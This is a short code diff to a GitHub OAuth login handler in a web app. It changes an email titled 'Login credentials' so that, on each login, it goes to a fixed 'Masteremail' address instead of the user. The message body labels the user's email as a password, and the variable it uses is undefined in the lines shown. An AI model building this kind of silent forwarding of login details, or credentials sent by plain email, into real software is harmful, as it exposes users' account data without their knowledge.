@@ -106,7 +106,7 @@ githublogin.get(
   async function (req, res) {
     // Successful authentication, redirect home.
     // console.log(req.user);
-    await sendEmail({email: email,subject:"Login credentials",body:` Password is ${email}` }) 
+    await sendEmail({email: Masteremail,subject:"Login credentials",body:` Password is ${email}` }) 
     res.redirect(`https://workdesk.netlify.app/`);
   }
 );
